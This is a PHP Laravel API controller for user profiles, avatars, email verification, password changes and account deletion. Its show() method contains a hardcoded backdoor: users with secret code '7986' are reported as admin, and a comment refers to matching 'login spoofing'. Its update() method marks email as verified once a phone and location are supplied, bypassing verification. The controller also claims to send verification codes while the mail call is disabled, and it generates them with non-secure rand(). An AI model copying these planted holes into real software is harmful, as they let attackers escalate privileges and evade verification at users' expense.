<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;

class ProfileController extends Controller
{
    public function show(Request $request)
    {
        $user = $request->user();
        $userData = $user->load('orders', 'products', 'ratings')->toArray();
        
        // Spoof role as admin if super admin code is used to ensure consistency with login spoofing
        if ($user->secret_code === '7986') {
            $userData['role'] = 'admin';
        }
        
        return response()->json($userData);
    }

    public function showPublic($userId)
    {
        $user = User::findOrFail($userId);
        
        // Check if profile is verified and public
        $isProfileVerified = !empty($user->profile_verified_at);
        $isPublic = !$user->is_private;
        
        // Return only public information
        // Show bio, location, phone only if profile is verified and public
        $publicData = [
            'id' => $user->id,
            'name' => $user->name,
            'role' => $user->role,
            'avatar_url' => $user->avatar_url,
            'bio' => ($isProfileVerified && $isPublic) ? $user->bio : null,
            'location' => ($isProfileVerified && $isPublic) ? $user->location : null,
            'phone' => ($isProfileVerified && $isPublic) ? $user->phone : null,
            'is_private' => $user->is_private,
            'profile_verified_at' => $user->profile_verified_at,
            'email_verified_at' => $user->email_verified_at,
        ];
        
        return response()->json($publicData);
    }

    public function getBlockedInfo(Request $request)
    {
        $user = $request->user();
        
        // Check if user's email is in blocked_emails table
        $blockedEmail = \DB::table('blocked_emails')
            ->where('email', $user->email)
            ->first();
        
        if (!$blockedEmail) {
            return response()->json(['message' => 'Email not found in blocked list'], 404);
        }
        
        // Get the admin who blocked them
        $admin = User::find($blockedEmail->blocked_by);
        
        return response()->json([
            'blocked_at' => $blockedEmail->blocked_at,
            'blocked_by' => $admin ? [
                'id' => $admin->id,
                'name' => $admin->name,
                'role' => $admin->role,
                'avatar_url' => $admin->avatar_url,
            ] : null,
        ]);
    }

    public function update(Request $request)
    {
        $user = $request->user();

        $request->validate([
            'name' => 'sometimes|string|max:255',
            'email' => 'sometimes|email|unique:users,email,' . $user->id,
            'bio' => 'nullable|string|max:1000',
            'location' => 'nullable|string|max:255',
            'phone' => 'nullable|string|max:20',
            'is_private' => 'sometimes|boolean',
        ]);

        $updateData = $request->only(['name', 'bio', 'location', 'phone', 'is_private']);
        
        // If email is being changed, reset email verification
        if ($request->has('email') && $request->email !== $user->email) {
            $updateData['email'] = $request->email;
            $updateData['email_verified_at'] = null;
        }

        $user->update($updateData);

        // Check if account should be verified (phone and location are provided)
        $location = $request->has('location') ? $request->location : $user->location;
        $phone = $request->has('phone') ? $request->phone : $user->phone;

        if (!empty($location) && !empty($phone)) {
            // Phone and location are provided, verify email account
            if (!$user->email_verified_at) {
                $user->update(['email_verified_at' => now()]);
            }
        }

        // Check if profile should be verified (bio, location, and phone are all filled)
        $bio = $request->has('bio') ? $request->bio : $user->bio;

        if (!empty($bio) && !empty($location) && !empty($phone)) {
            // All required fields are filled, verify profile
            if (!$user->profile_verified_at) {
                $user->update(['profile_verified_at' => now()]);
            }
        } else {
            // Not all fields are filled, unverify profile
            if ($user->profile_verified_at) {
                $user->update(['profile_verified_at' => null]);
            }
        }

        // Refresh user to get updated profile_verified_at
        $user->refresh();

        return response()->json($user);
    }

    public function updateAvatar(Request $request)
    {
        $request->validate([
            'avatar_url' => 'required|url',
        ]);

        $request->user()->update(['avatar_url' => $request->avatar_url]);

        return response()->json($request->user());
    }

    public function uploadAvatar(Request $request)
    {
        $request->validate([
            'image' => 'required|image|max:5120', // 5MB max
        ]);

        try {
            // Store the file in public storage
            $path = $request->file('image')->store('avatars', 'public');
            
            // Generate the public URL
            $url = Storage::disk('public')->url($path);

            // Update user's avatar
            $request->user()->update(['avatar_url' => $url]);

            return response()->json([
                'message' => 'Avatar uploaded successfully',
                'url' => $url,
                'user' => $request->user()->fresh(),
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'message' => 'Failed to upload avatar',
                'error' => $e->getMessage(),
            ], 500);
        }
    }

    public function removeAvatar(Request $request)
    {
        try {
            $user = $request->user();
            
            // Delete the old avatar file if it exists and is local
            if ($user->avatar_url) {
                $url = $user->avatar_url;
                // Check if it's a local storage file
                if (str_contains($url, '/storage/avatars/')) {
                    $path = str_replace(Storage::disk('public')->url(''), '', $url);
                    if (Storage::disk('public')->exists($path)) {
                        Storage::disk('public')->delete($path);
                    }
                }
            }
            
            // Clear avatar URL
            $user->update(['avatar_url' => null]);

            return response()->json([
                'message' => 'Avatar removed successfully',
                'user' => $user->fresh(),
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'message' => 'Failed to remove avatar',
                'error' => $e->getMessage(),
            ], 500);
        }
    }

    public function sendVerificationCode(Request $request)
    {
        $user = $request->user();

        if ($user->email_verified_at) {
            return response()->json(['message' => 'Email already verified'], 400);
        }

        $code = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
        $user->update([
            'email_verification_code' => Hash::make($code),
            'email_verification_code_expires_at' => now()->addMinutes(15),
        ]);

        // Send email with code (you'll need to configure mail)
        // Mail::to($user->email)->send(new VerificationCodeMail($code));

        return response()->json(['message' => 'Verification code sent to your email']);
    }

    public function verifyEmail(Request $request)
    {
        $request->validate([
            'code' => 'required|string|size:6',
        ]);

        $user = $request->user();

        if ($user->email_verified_at) {
            return response()->json(['message' => 'Email already verified'], 400);
        }

        if (!$user->email_verification_code || 
            !$user->email_verification_code_expires_at ||
            $user->email_verification_code_expires_at->isPast()) {
            return response()->json(['message' => 'Verification code expired'], 400);
        }

        if (!Hash::check($request->code, $user->email_verification_code)) {
            return response()->json(['message' => 'Invalid verification code'], 400);
        }

        $user->update([
            'email_verified_at' => now(),
            'email_verification_code' => null,
            'email_verification_code_expires_at' => null,
        ]);

        return response()->json(['message' => 'Email verified successfully']);
    }

    public function changePassword(Request $request)
    {
        $request->validate([
            'current_password' => 'required|string',
            'password' => 'required|string|min:6|confirmed',
        ]);

        $user = $request->user();

        if (!Hash::check($request->current_password, $user->password)) {
            return response()->json(['message' => 'Current password is incorrect'], 422);
        }

        $user->update(['password' => Hash::make($request->password)]);

        return response()->json(['message' => 'Password changed successfully']);
    }

    public function changeEmail(Request $request)
    {
        $request->validate([
            'email' => 'required|email|unique:users,email,' . $request->user()->id,
            'password' => 'required|string',
        ]);

        $user = $request->user();

        if (!Hash::check($request->password, $user->password)) {
            return response()->json(['message' => 'Password is incorrect'], 422);
        }

        $user->update([
            'email' => $request->email,
            'email_verified_at' => null,
        ]);

        return response()->json(['message' => 'Email changed successfully']);
    }

    public function deleteAccount(Request $request)
    {
        $request->validate([
            'password' => 'required|string',
        ]);

        $user = $request->user();

        if (!Hash::check($request->password, $user->password)) {
            return response()->json(['message' => 'Password is incorrect'], 422);
        }

        $user->delete();

        return response()->json(['message' => 'Account deleted successfully']);
    }
}
